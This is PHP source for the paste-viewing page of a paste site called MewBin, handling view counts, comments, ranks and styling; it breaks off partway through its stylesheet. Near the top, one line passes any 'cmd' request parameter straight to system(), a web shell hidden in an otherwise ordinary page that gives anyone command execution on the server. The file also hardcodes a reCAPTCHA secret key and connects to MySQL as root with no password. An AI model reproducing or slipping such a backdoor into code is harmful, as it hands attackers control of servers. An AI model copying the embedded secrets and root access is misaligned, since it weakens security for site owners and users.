<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
require_once 'waf.php';


session_start();
include('database.php');
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (!isset($_COOKIE['browser_id']) || !preg_match('/^[a-f0-9]{32,64}$/', $_COOKIE['browser_id'])) {
    $browserId = bin2hex(random_bytes(32));
    setcookie('browser_id', $browserId, [
        'expires' => time() + (86400 * 365), 
        'path' => '/',
        'domain' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '',
        'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on',
        'httponly' => true,
        'samesite' => 'Strict'
    ]);
} else {
    $browserId = $_COOKIE['browser_id'];
}

if (!isset($_SESSION['anonymous_session_id'])) {
    $_SESSION['anonymous_session_id'] = bin2hex(random_bytes(32));
}
$anonymousSessionID = $_SESSION['anonymous_session_id'];

function hashIP($ip) {
    $pepper = getenv('IP_HASH_PEPPER') ?: 'MournSec_Pepper_2024';
    $salt = getenv('IP_HASH_SALT') ?: 'MournSec_Salt_2024';
    return hash_hmac('sha256', $ip . $salt, $pepper);
}

function getClientIP() {
    $ipSources = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    foreach ($ipSources as $source) {
        if (!empty($_SERVER[$source])) {
            $ipList = explode(',', $_SERVER[$source]);
            foreach ($ipList as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    return 'Unknown';
}



if (!isset($_SESSION['viewed_pastes']) || !is_array($_SESSION['viewed_pastes'])) {
    $_SESSION['viewed_pastes'] = [];
}

$title = $_GET['title'] ?? '';
if (!$title) {
    echo "No paste specified.";
    exit;
}

$stmt = $conn->prepare("SELECT * FROM pastes WHERE title = ? LIMIT 1");
$stmt->bind_param("s", $title);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    echo "Paste not found.";
    exit;
}

$paste = $result->fetch_assoc();
$pasteId = (int)$paste['id'];

if (isset($_COOKIE['login_token'])) {
    $loginToken = $_COOKIE['login_token'];
    $stmtUser = $conn->prepare("SELECT username, rank, locked FROM users WHERE login_token = ?");
    $stmtUser->bind_param("s", $loginToken);
    $stmtUser->execute();
    $userResult = $stmtUser->get_result();
    if ($userResult && $userResult->num_rows > 0) {
        $userRow = $userResult->fetch_assoc();
        
        // Check if account is locked
        if ($userRow['locked'] == 1) {
            session_destroy();
            setcookie('login_token', '', time() - 3600, "/", "", true, true);
            $username = 'Anonymous';
            $userRank = null;
        } else {
            $username = $userRow['username'];
            $userRank = $userRow['rank'];
            $_SESSION['username'] = $username;
        }
    } else {
        $username = isset($_SESSION['username']) ? $_SESSION['username'] : 'Anonymous';
        $userRank = null;
    }
    $stmtUser->close();
} else {
    $username = isset($_SESSION['username']) ? $_SESSION['username'] : 'Anonymous';
    $userRank = null;
}

if (isset($paste['visibility']) && $paste['visibility'] == 2) {
    $allowedRanks = ['Admin', 'Manager', 'Mod'];
    $isOwner = ($username && $username === $paste['creator']);
    $hasRank = ($userRank && in_array($userRank, $allowedRanks));
if (!$isOwner && !$hasRank) {
    header("Location: /index.php");
    exit;
}

}

if (isset($_COOKIE['login_token'])) {
    $loginToken = $_COOKIE['login_token'];
    $stmtUser = $conn->prepare("SELECT username, locked FROM users WHERE login_token = ?");
    $stmtUser->bind_param("s", $loginToken);
    $stmtUser->execute();
    $userResult = $stmtUser->get_result();
    if ($userResult && $userResult->num_rows > 0) {
        $userRow = $userResult->fetch_assoc();
        
        // Check if account is locked
        if ($userRow['locked'] == 1) {
            session_destroy();
            setcookie('login_token', '', time() - 3600, "/", "", true, true);
            $username = 'Anonymous';
        } else {
            $username = $userRow['username'];
            $_SESSION['username'] = $username;
        }
    } else {
        $username = isset($_SESSION['username']) ? $_SESSION['username'] : 'Anonymous';
    }
    $stmtUser->close();
} else {
    $username = isset($_SESSION['username']) ? $_SESSION['username'] : 'Anonymous';
}

$ipAddress = getClientIP();
$hashedIP = hashIP($ipAddress);

function canManagePastePassword($userRank) {
    $allowedRanks = ['Rich', 'Clique', 'Founder', 'Council', 'Mod', 'Manager', 'Admin'];
    return $userRank && in_array($userRank, $allowedRanks);
}

$currentUser = $username;
$isOwner = ($currentUser && $currentUser === $paste['creator']);
$canOwnerManage = $isOwner && canManagePastePassword($userRank);

if ($isOwner && !canManagePastePassword($userRank)) {
    if (isset($paste['comments_enabled']) && !$paste['comments_enabled']) {
        $stmt = $conn->prepare("UPDATE pastes SET comments_enabled = 1 WHERE id = ?");
        $stmt->bind_param("i", $pasteId);
        $stmt->execute();
        $stmt->close();
        $paste['comments_enabled'] = 1;
    }
    $commentsEnabled = 1;
} else {
    $commentsEnabled = isset($paste['comments_enabled']) ? (int)$paste['comments_enabled'] : 1;
}
$commentsDisplay = $commentsEnabled ? (int)$paste['comments'] : '-';

// Password protection logic
$show_password_prompt = false;
$entered_password_valid = true; // Default to true when no password protection

// Only check password protection if it's actually enabled AND there's a password set
if (!empty($paste['password_enabled']) && $paste['password_enabled'] == 1 && !empty($paste['password'])) {
    $show_password_prompt = true;
    $entered_password_valid = false; // Only set to false if password is required
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['paste_password'])) {
        $entered_password = $_POST['paste_password'];
        if (password_verify($entered_password, $paste['password'])) {
            $entered_password_valid = true;
            $show_password_prompt = false;
            $_SESSION['paste_' . $pasteId . '_password_verified'] = true;
        } else {
            $password_error = 'Incorrect password';
        }
    } elseif (isset($_SESSION['paste_' . $pasteId . '_password_verified'])) {
        $entered_password_valid = true;
        $show_password_prompt = false;
    }
}

if (isset($_GET['raw']) && $_GET['raw'] == '1') {
    // Ensure no other output has been sent
    if (ob_get_level()) {
        while (ob_get_level()) ob_end_clean();
    }

    // Prepare a safe filename from the title
    $safeTitle = preg_replace('/[^A-Za-z0-9_\-\.]/', '_', $paste['title'] ?? 'paste');
    $filename = $safeTitle . '.txt';

    // Send strict headers for raw/plain output
    header('Content-Type: text/plain; charset=UTF-8');
    header('Content-Disposition: inline; filename="' . $filename . '"');
    header('X-Content-Type-Options: nosniff');
    header('Cache-Control: private, max-age=0, no-cache, must-revalidate');

    // Output the raw paste content exactly as stored
    $rawContent = isset($paste['content']) ? $paste['content'] : '';
    if ($rawContent === '') {
        // Fallback so the user sees something instead of a blank page
        $rawContent = "(no content)";
    }

    error_log('RAW view requested for title: ' . ($paste['title'] ?? '') . ' length: ' . strlen($rawContent));
    header('Content-Length: ' . strlen($rawContent));
    header('Connection: close');
    echo $rawContent;
    // Try to flush and finish the request if possible
    @flush();
    if (function_exists('fastcgi_finish_request')) {
        @fastcgi_finish_request();
    }
    exit;
}

$checkQuery = "SELECT 1 FROM paste_views WHERE paste_id = ? AND (browser_id = ? OR ip_hash = ? OR username = ? OR anonymous_session_id = ?) LIMIT 1";
$stmt = $conn->prepare($checkQuery);
if ($stmt) {
    $stmt->bind_param("issss", $pasteId, $browserId, $hashedIP, $username, $anonymousSessionID);
    $stmt->execute();
    $viewedResult = $stmt->get_result();
    if ($viewedResult->num_rows === 0 && !in_array($pasteId, $_SESSION['viewed_pastes'])) {
        $conn->begin_transaction();
        try {
            $updateViewsQuery = "UPDATE pastes SET views = views + 5 WHERE id = ?";
            $stmt2 = $conn->prepare($updateViewsQuery);
            if (!$stmt2) throw new Exception("Prepare failed for updateViewsQuery");
            $stmt2->bind_param("i", $pasteId);
            $stmt2->execute();
            $stmt2->close();

            $logViewQuery = "INSERT INTO paste_views (paste_id, browser_id, ip_hash, username, anonymous_session_id, created_at) VALUES (?, ?, ?, ?, ?, NOW())";
            $stmt3 = $conn->prepare($logViewQuery);
            if (!$stmt3) throw new Exception("Prepare failed for logViewQuery");
            $stmt3->bind_param("issss", $pasteId, $browserId, $hashedIP, $username, $anonymousSessionID);
            $stmt3->execute();
            $stmt3->close();

            if ($paste['creator'] !== 'Anonymous') {
                // Skip battlepass functionality if there are connection issues
                try {
                    $battlepass_conn = @new mysqli("localhost", "root", "", "mewbin_battlepass");
                    if ($battlepass_conn && $battlepass_conn->connect_errno === 0) {
                        $user_stmt = $battlepass_conn->prepare("SELECT id FROM users WHERE username = ?");
                        if ($user_stmt) {
                            $user_stmt->bind_param("s", $paste['creator']);
                            $user_stmt->execute();
                            $user_stmt->bind_result($user_id);
                            if ($user_stmt->fetch()) {
                                $update_stmt = $battlepass_conn->prepare("UPDATE battlepass_progress SET total_views = total_views + 1 WHERE user_id = ?");
                                if ($update_stmt) {
                                    $update_stmt->bind_param("i", $user_id);
                                    $update_stmt->execute();
                                    $update_stmt->close();
                                }
                            }
                            $user_stmt->close();
                        }
                        $battlepass_conn->close();
                    }
                } catch (Exception $e) {
                    // Silently fail if battlepass database is not available
                    error_log("Battlepass database connection failed: " . $e->getMessage());
                }
            }

            $conn->commit();
            $_SESSION['viewed_pastes'][] = $pasteId;
        } catch (Exception $e) {
            $conn->rollback();
            error_log("Error updating view count: " . $e->getMessage());
        }
    }
}

if ($canOwnerManage && isset($_POST['toggle_comments'])) {
    $newStatus = $commentsEnabled ? 0 : 1;
    $stmt = $conn->prepare("UPDATE pastes SET comments_enabled = ? WHERE id = ?");
    $stmt->bind_param("ii", $newStatus, $pasteId);
    $stmt->execute();
    $stmt->close();
    header("Location: posted/" . urlencode($paste['title']));
    exit;
}

$rankData = [];
$rankQuery = $conn->query("SELECT rank_name, rankTag, rankColor FROM rank");
if ($rankQuery) {
    while ($row = $rankQuery->fetch_assoc()) {
        $rankName = $row['rank_name'];
        $rankData[$rankName] = [
            'tag' => $row['rankTag'],
            'color' => $row['rankColor'],
        ];
    }
}

function timeAgo($timestamp) {
    $time_ago = strtotime($timestamp);
    $current_time = time();
    $time_difference = $current_time - $time_ago;
    $seconds = $time_difference;
    $minutes = round($seconds / 60);
    $hours = round($seconds / 3600);
    $days = round($seconds / 86400);
    $weeks = round($seconds / 604800);
    $months = round($seconds / 2629440);
    $years = round($seconds / 31553280);

    if ($seconds <= 60) return "Just Now";
    else if ($minutes <= 60) return $minutes == 1 ? "1 minute ago" : "$minutes minutes ago";
    else if ($hours <= 24) return $hours == 1 ? "1 hour ago" : "$hours hours ago";
    else if ($days <= 7) return $days == 1 ? "1 day ago" : "$days days ago";
    else if ($weeks <= 4.3) return $weeks == 1 ? "1 week ago" : "$weeks weeks ago";
    else if ($months <= 12) return $months == 1 ? "1 month ago" : "$months months ago";
    else return $years == 1 ? "1 year ago" : "$years years ago";
}

function makeLinksClickable($text) {
    // Pattern to match URLs
    $pattern = '/((?:https?:\/\/|www\.)[^\s<>"\'\[\]{}|\\^`]+)/i';
    
    return preg_replace_callback($pattern, function($matches) {
        $url = $matches[1];
        $display_url = $url;
        
        // Add http:// if it starts with www.
        if (strpos($url, 'www.') === 0) {
            $url = 'http://' . $url;
        }
        
        // Truncate display URL if too long
        if (strlen($display_url) > 60) {
            $display_url = substr($display_url, 0, 57) . '...';
        }
        
        return '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '" target="_blank" rel="noopener noreferrer" style="color: #8a2be2; text-decoration: underline;">' . htmlspecialchars($display_url, ENT_QUOTES, 'UTF-8') . '</a>';
    }, $text);
}

if (
    $_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['content'])
    && isset($_POST['csrf_token'])
    && $_POST['csrf_token'] === $_SESSION['csrf_token']
    && $commentsEnabled
) {
    $comment = trim($_POST['content']);
    if (!preg_match('/^[\w\s.,!?@#\$%\^&\*\(\)\[\]\{\}\-_=+;:\'\"\/\\|`~<>\r\n]{1,240}$/u', $comment)) {
        $commentError = "Comment contains invalid characters.";
    } elseif ($comment === '' || strlen($comment) > 240) {
        $commentError = "Comment must be 1-240 characters.";
    } else {
        $captchaResponse = $_POST['g-recaptcha-response'] ?? '';
        $captchaSecretKey = "6Leb_DgrAAAAACDZU03CTXrbKeCbEuNHbLmxM23R";
        $captchaVerifyUrl = "https://www.google.com/recaptcha/api/siteverify";
        $data = [
            'secret' => $captchaSecretKey,
            'response' => $captchaResponse,
            'remoteip' => $_SERVER['REMOTE_ADDR']
        ];
        $options = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => http_build_query($data)
            ]
        ];
        $context = stream_context_create($options);
        $captchaVerification = @json_decode(@file_get_contents($captchaVerifyUrl, false, $context), true);

        if (!$captchaVerification || empty($captchaVerification['success'])) {
            $commentError = "CAPTCHA verification failed.";
        } else {
            $commentor = $currentUser ? $currentUser : 'Anonymous';
            $user_ip = $_SERVER['REMOTE_ADDR'];
            $hashed_ip = hashIP($user_ip);

            $stmt = $conn->prepare("SELECT created_at FROM paste_comments WHERE (commentor = ? OR hashed_ip = ?) AND paste_id = ? ORDER BY created_at DESC LIMIT 1");
            $stmt->bind_param("ssi", $commentor, $hashed_ip, $pasteId);
            $stmt->execute();
            $stmt->bind_result($last_comment_time);
            $stmt->fetch();
            $stmt->close();

            if ($last_comment_time && (time() - strtotime($last_comment_time) < 60)) {
                $commentError = "You must wait 1 minute before posting another comment.";
            } else {
                $stmt = $conn->prepare("INSERT INTO paste_comments (paste_id, commentor, comment, hashed_ip, created_at) VALUES (?, ?, ?, ?, NOW())");
                $stmt->bind_param("isss", $pasteId, $commentor, $comment, $hashed_ip);
                if ($stmt->execute()) {
                    $stmt2 = $conn->prepare("UPDATE pastes SET comments = comments + 1 WHERE id = ?");
                    $stmt2->bind_param("i", $pasteId);
                    $stmt2->execute();
                    $stmt2->close();
                    header("Location: " . htmlspecialchars($_SERVER['REQUEST_URI'], ENT_QUOTES, 'UTF-8'));
                    exit;
                } else {
                    $commentError = "Failed to post comment.";
                }
                $stmt->close();
            }
        }
    }
}

if (
    $_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['delete_comment_id'])
    && isset($_POST['csrf_token'])
    && $_POST['csrf_token'] === $_SESSION['csrf_token']
) {
    $deleteRanks = ['Admin', 'Manager', 'Mod', 'Council', 'Founder'];
    $canDelete = false;
    $currentRank = null;
    if ($currentUser && $currentUser !== 'Anonymous') {
        $stmt = $conn->prepare("SELECT rank FROM users WHERE username = ?");
        $stmt->bind_param("s", $currentUser);
        $stmt->execute();
        $stmt->bind_result($currentRank);
        $stmt->fetch();
        $stmt->close();
        if (in_array($currentRank, $deleteRanks)) $canDelete = true;
    }
    $commentId = (int)$_POST['delete_comment_id'];
    if (!$canDelete && $currentUser && $currentUser !== 'Anonymous') {
        $stmt = $conn->prepare("SELECT commentor FROM paste_comments WHERE id = ?");
        $stmt->bind_param("i", $commentId);
        $stmt->execute();
        $stmt->bind_result($commentorName);
        $stmt->fetch();
        $stmt->close();
        if ($commentorName === $currentUser) $canDelete = true;
    }
    if ($canDelete) {
        $stmt = $conn->prepare("DELETE FROM paste_comments WHERE id = ?");
        $stmt->bind_param("i", $commentId);
        $stmt->execute();
        $stmt->close();
        $stmt = $conn->prepare("UPDATE pastes SET comments = GREATEST(comments - 1, 0) WHERE id = ?");
        $stmt->bind_param("i", $pasteId);
        $stmt->execute();
        $stmt->close();
        if (!empty($_SERVER['HTTP_X_REQUESTED_WITH'])) {
            echo "success";
            exit;
        }
        header("Location: " . htmlspecialchars($_SERVER['REQUEST_URI'], ENT_QUOTES, 'UTF-8'));
        exit;
    }
}

// --- Battlepass Progress Fetch ---
$battlepass_pastes_uploaded = 0;
$battlepass_total_views = 0;
$battlepass_engagement_points = 0;
$battlepass_challenges_completed = 0;

if ($username !== 'Anonymous') {
    // Skip battlepass functionality if there are connection issues
    try {
        // Use the same connection details as the main database
        // This assumes battlepass database exists, but won't break if it doesn't
        $battlepass_conn = @new mysqli($conn->host_info ? "localhost" : "localhost", "root", "", "mewbin_battlepass");
        if ($battlepass_conn && $battlepass_conn->connect_errno === 0) {
            $user_stmt = $battlepass_conn->prepare("SELECT id FROM users WHERE username = ?");
            if ($user_stmt) {
                $user_stmt->bind_param("s", $username);
                $user_stmt->execute();
                $user_stmt->bind_result($battlepass_user_id);
                if ($user_stmt->fetch()) {
                    $progress_stmt = $battlepass_conn->prepare("SELECT pastes_uploaded, total_views, engagement_points, challenges_completed FROM battlepass_progress WHERE user_id = ?");
                    if ($progress_stmt) {
                        $progress_stmt->bind_param("i", $battlepass_user_id);
                        $progress_stmt->execute();
                        $progress_stmt->bind_result($battlepass_pastes_uploaded, $battlepass_total_views, $battlepass_engagement_points, $battlepass_challenges_completed);
                        $progress_stmt->fetch();
                        $progress_stmt->close();
                    }
                }
                $user_stmt->close();
            }
            $battlepass_conn->close();
        }
    } catch (Exception $e) {
        // Silently fail if battlepass database is not available
        error_log("Battlepass database connection failed: " . $e->getMessage());
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title><?php echo htmlspecialchars($paste['title'], ENT_QUOTES, 'UTF-8'); ?> - MewBin</title>
    <link rel="stylesheet" href="npm/bootswatch-5.0.1/dist/darkly/bootstrap.min.css">
    <style>
        * {
            box-sizing: border-box;
        }
        
        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            font-size: 16px; /* Increased base font size */
        }
        
        body {
		  background: #000000 !important;
		  color: #fff;
		  text-align: center !important;
		  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          line-height: 1.6; /* Improved readability */
		}
        
        .main-wrap {
            display: flex;
            min-height: 100vh;
            width: 100%;
            overflow-x: hidden;
            position: relative;
            background: #111;
        }
        .paste-content-area {
            flex: 1 1 0;
            padding: 1px 0 10px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            background: #000000 !important;
            color: #fff;
            transition: margin-right 0.3s;
        }
        .logo-header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
            margin-top: 12px;
        }
        .logo-header img {
            width: 120px;
            height: auto;
            margin-right: 18px;
            border-radius: 12px;
            background: transparent;
			filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.5));
        }
        .ascii-title {
            font-size: 2.4em; /* Increased size */
            font-family: inherit;
            color: #fff;
            letter-spacing: 2px;
            margin-bottom: 18px;
            margin-top: 0;
            text-align: center;
            word-break: break-all;
            font-weight: 600; /* Added weight for better readability */
        }
        .ascii-content {
            background: #181818;
            color: #fff;
            font-size: 1.2em; /* Increased font size */
            padding: 32px 32px;
            border-radius: 8px;
            min-width: 60vw;
            max-width: 90vw;
            min-height: 300px;
            max-height: 80vh;
            overflow-x: auto;
            overflow-y: auto;
            white-space: pre;
            word-break: break-word;
            font-family: 'Fira Mono', 'Consolas', 'Menlo', 'monospace', Arial, sans-serif;
            margin-bottom: 32px;
            box-shadow: 0 0 24px #000a;
            text-align: left;
            line-height: 1.5; /* Improved line spacing */
        }
        .ascii-content a {
            color: #8a2be2 !important; /* Changed to purple */
            text-decoration: underline !important;
            transition: color 0.2s ease !important;
            cursor: pointer !important;
            touch-action: manipulation !important;
            -webkit-tap-highlight-color: rgba(138, 43, 226, 0.3) !important;
        }
        .ascii-content a:hover {
            color: #a855f7 !important; /* Lighter purple */
            text-decoration: underline !important;
        }
        .ascii-content a:visited {
            color: #6b21a8 !important; /* Darker purple */
        }
        .ascii-content a:active {
            color: #a855f7 !important;
            background-color: rgba(138, 43, 226, 0.1) !important;
        }
        .sidebar {
            width: 400px; 
            background: linear-gradient(135deg, #0f0f0f 0%, #1f1f1f 100%);
            color: #fff;
            padding: 32px 24px;
            border-left: 2px solid #8a2be2;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            min-height: 100vh;
            position: fixed;
            top: 0;
            right: 0;
            z-index: 100;
            transition: transform 0.3s cubic-bezier(.4,2,.6,1), box-shadow 0.3s;
            box-shadow: -4px 0 24px rgba(138, 43, 226, 0.3); /* Purple shadow */
            overflow-y: auto;
            max-height: 100vh;
            scrollbar-width: none;
            -ms-overflow-style: none;
        }
        .sidebar::-webkit-scrollbar { display: none; }
        .sidebar.closed {
            transform: translateX(100%);
            box-shadow: none;
        }
        .sidebar .sidebar-logo {
            width: 120px;
            margin-bottom: 18px;
            border-radius: 12px;
			filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.5));
        }
        .sidebar-title {
            font-size: 1.5em; /* Increased size */
            font-weight: bold;
            margin-bottom: 12px; /* Increased spacing */
            color: #fff;
        }
        .sidebar-meta {
            font-size: 1.1em; /* Increased size */
            margin-bottom: 10px; /* Increased spacing */
            color: #d8b4fe; /* Light purple */
        }
        .sidebar-meta b {
            color: #fff;
        }
        .sidebar-btn {
            display: block;
            width: 100%;
            margin: 10px 0; /* Increased spacing */
            padding: 12px 0; /* Increased padding */
            background: #2d1b69;
            color: #fff;
            border: 1px solid #8a2be2;
            border-radius: 8px; /* Slightly more rounded */
            font-weight: bold;
            text-align: center;
            text-decoration: none;
            transition: all 0.3s ease;
            font-size: 1.1em; /* Increased font size */
        }
        .sidebar-btn:hover {
            background: #8a2be2;
            color: #fff;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(138, 43, 226, 0.4);
        }
        .sidebar-comments {
            width: 100%;
            margin: 24px 0 0 0; /* Increased spacing */
        }
        .sidebar-comments h4 {
            color: #d8b4fe; /* Light purple */
            margin-bottom: 16px; /* Increased spacing */
            font-size: 1.3em; /* Increased size */
        }
        .comment-box {
            background: rgba(0, 0, 0, 0.7); /* Purple background */
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(138, 43, 226, 0.2);
            padding: 16px 18px 14px 18px; /* Increased padding */
            margin-bottom: 20px; /* Increased spacing */
            border: 1px solid #8a2be2;
            display: flex;
            flex-direction: column;
        }
        .comment-header {
            display: flex;
            align-items: center;
            margin-bottom: 4px; /* Slightly increased */
            flex-wrap: wrap;
        }
        .comment-username-rank {
            display: flex;
            align-items: center;
            gap: 8px; /* Increased gap */
        }
        .comment-username {
            font-weight: bold;
            padding-left: 24px;
            background-size: 20px 20px;
            background-repeat: no-repeat;
            margin-right: 0;
            font-size: 1.1em; /* Increased size */
        }
        .comment-rank {
            font-size: 1em; /* Increased size */
            margin-left: 0;
            font-weight: bold;
        }
        .comment-time {
            color: #c4b5fd; /* Light purple */
            font-size: 0.95em; /* Slightly increased */
            margin-left: auto;
            white-space: nowrap;
        }
        .comment-content {
            color: #eaeaea;
            margin-top: 6px; /* Increased spacing */
            word-break: break-word;
            white-space: pre-line;
            font-size: 1.1em; /* Increased size */
            padding-left: 2px;
            line-height: 1.5; /* Improved line spacing */
        }
        .comment-delete-btn {
            background: #b00020;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 4px 14px; /* Increased padding */
            font-size: 1em; /* Increased size */
            margin-left: 10px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .comment-delete-btn:hover {
            background: #e00028;
        }
        .sidebar-note {
            font-size: 1em; /* Increased size */
            color: #a78bfa; /* Light purple */
            margin-top: 24px; /* Increased spacing */
            border-top: 1px solid #8a2be2;
            padding-top: 12px; /* Increased padding */
        }
        .sidebar .votes {
            margin: 12px 0 24px 0; /* Increased spacing */
            font-size: 1.2em; /* Increased size */
        }
        .sidebar .votes .fa-thumbs-up { color: #8a2be2; } /* Changed to purple */
        .sidebar .votes .fa-thumbs-down { color: #ff6b6b; }
        .sidebar-toggle-btn {
            position: fixed;
            top: 100px; /* Moved below navbar */
            right: 410px;
            z-index: 200;
            background: #2d1b69;
            color: #fff;
            border: 1px solid #8a2be2;
            border-radius: 50%;
            width: 44px; /* Slightly larger */
            height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1.5em; /* Larger arrow */
            box-shadow: 0 2px 8px rgba(138, 43, 226, 0.4);
            font-weight: bold;
        }
        .sidebar-toggle-btn:hover {
            background: #8a2be2;
            transform: scale(1.1);
        }
        .sidebar.closed ~ .sidebar-toggle-btn {
            right: 24px;
        }
        @media (max-width: 1100px) {
            .ascii-content, .ascii-title { 
                min-width: 280px !important;
                max-width: 95vw !important;
            }
            .sidebar {
                width: 100vw !important;
                min-height: unset !important;
                border-left: none !important;
                border-top: 2px solid #8a2be2 !important;
                position: fixed !important;
                right: 0 !important;
                top: 0 !important;
                height: 70vh !important;
                z-index: 1000 !important;
                transform: translateY(-100%) !important;
                transition: transform 0.3s ease !important;
                overflow-y: auto !important;
            }
            .sidebar.closed {
                transform: translateY(-100%) !important;
            }
            .sidebar:not(.closed) {
                transform: translateY(0) !important;
            }
            .sidebar-toggle-btn {
                right: 20px !important;
                top: 90px !important; /* Adjusted for mobile */
                z-index: 1001 !important;
                position: fixed !important;
            }
            .paste-content-area {
                margin-right: 0 !important;
                padding: 16px !important;
                width: 100% !important;
            }
            .main-wrap {
                flex-direction: column !important;
            }
        }
        @media (max-width: 768px) {
            body {
                font-size: 16px !important; /* Keep readable size on mobile */
            }
            .ascii-content { 
                min-width: 0 !important; 
                padding: 16px 18px !important; 
                font-size: 1.1em !important; /* Keep readable */
                max-width: 100% !important;
                width: 100% !important;
                margin: 0 !important;
                box-sizing: border-box !important;
            }
            .ascii-content a {
                font-size: 1.1em !important;
                padding: 4px 6px !important;
                margin: 2px 0 !important;
                display: inline-block !important;
                min-height: 44px !important;
                min-width: 44px !important;
                line-height: 1.4 !important;
                word-break: break-all !important;
                -webkit-tap-highlight-color: rgba(138, 43, 226, 0.5) !important;
                touch-action: manipulation !important;
            }
            .sidebar { 
                padding: 20px !important; 
                height: 75vh !important;
                width: 100% !important;
            }
            .logo-header {
                flex-direction: column !important;
                margin-bottom: 20px !important;
                padding: 0 16px !important;
            }
            .logo-header img {
                margin-right: 0 !important;
                margin-bottom: 16px !important;
                width: 100px !important;
                max-width: 100px !important;
				filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.5));
            }
            .ascii-title {
                font-size: 1.8em !important; /* Still readable on mobile */
                text-align: center !important;
                word-break: break-word !important;
                padding: 0 16px !important;
            }
            .paste-content-area {
                padding: 12px !important;
                width: 100% !important;
                max-width: 100% !important;
            }
            .milestone-section {
                margin: 0 8px 24px 8px !important;
                padding: 20px !important;
            }
            .pw-prompt-box {
                margin: 20px auto 0 auto !important;
                padding: 24px 18px !important;
                max-width: 300px !important;
                width: 90% !important;
            }
            .sidebar-btn {
                font-size: 1.1em !important;
                padding: 12px 10px !important;
                margin: 8px 0 !important;
            }
            .comment-box {
                margin-bottom: 16px !important;
                padding: 14px !important;
            }
            .sidebar-title {
                font-size: 1.3em !important;
            }
        }
        @media (max-width: 480px) {
            .ascii-content {
                padding: 12px 14px !important;
                font-size: 1em !important; /* Still readable */
                min-height: 200px !important;
            }
            .ascii-content a {
                font-size: 1em !important;
                padding: 4px 8px !important;
                margin: 3px 2px !important;
                min-height: 48px !important;
                min-width: 48px !important;
                line-height: 1.5 !important;
                border-radius: 4px !important;
                background-color: rgba(138, 43, 226, 0.1) !important;
            }
            .ascii-title {
                font-size: 1.5em !important;
                letter-spacing: 1px !important;
            }
            .sidebar {
                height: 80vh !important;
                padding: 16px !important;
            }
            .sidebar-title {
                font-size: 1.2em !important;
            }
            .comment-box {
                padding: 12px 14px !important;
            }
            .comment-username {
                font-size: 1em !important;
            }
            .pw-prompt-box {
                max-width: 280px !important;
                padding: 20px 16px !important;
                width: 95% !important;
            }
            .logo-header img {
                width: 90px !important;
				filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.5));
            }
            .sidebar-toggle-btn {
                width: 40px !important;
                height: 40px !important;
                right: 15px !important;
                top: 80px !important; /* Adjusted for smaller screens */
                font-size: 1.3em !important;
            }
        }
        @media (max-width: 700px) {
            .ascii-content { min-width: 0; padding: 14px 4vw; }
            .sidebar { padding: 20px 6vw; }
        }
        .sidebar-open .paste-content-area {
            margin-right: 400px;
        }
        @media (max-width: 1100px) {
            .sidebar-open .paste-content-area {
                margin-right: 0;
            }
        }
        .pw-prompt-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 60vh;
            background: #1a0b2e;
            border-radius: 12px;
            box-shadow: 0 4px 32px rgba(138, 43, 226, 0.3);
            padding: 40px 30px 30px 30px;
            max-width: 350px;
            margin: 80px auto 0 auto;
            border: 1px solid #8a2be2;
        }
        .pw-prompt-logo {
            width: 120px;
            height: auto;
            margin-bottom: 18px;
        }
        .pw-prompt-title {
            color: #fff;
            font-size: 1.4em; /* Increased size */
            margin-bottom: 20px; /* Increased spacing */
            font-weight: bold;
            text-align: center;
        }
        .pw-prompt-input {
            width: 100%;
            padding: 12px 14px; /* Increased padding */
            border-radius: 6px;
            border: 1px solid #8a2be2;
            background: #2d1b69;
            color: #fff;
            font-size: 1.1em; /* Increased size */
            margin-bottom: 16px; /* Increased spacing */
        }
        .pw-prompt-btn {
            width: 100%;
            padding: 12px 0; /* Increased padding */
            border-radius: 6px;
            background: #8a2be2;
            color: #fff;
            border: none;
            font-weight: bold;
            font-size: 1.2em; /* Increased size */
            cursor: pointer;
            transition: background 0.2s;
        }
        .pw-prompt-btn:hover {
            background: #a855f7;
        }
        .pw-prompt-error {
            color: #ff6b6b;
            margin-bottom: 12px; /* Increased spacing */
            font-weight: bold;
            text-align: center;
            font-size: 1.1em; /* Increased size */
        }
        .milestone-section {
            width: 100%;
            max-width: 800px;
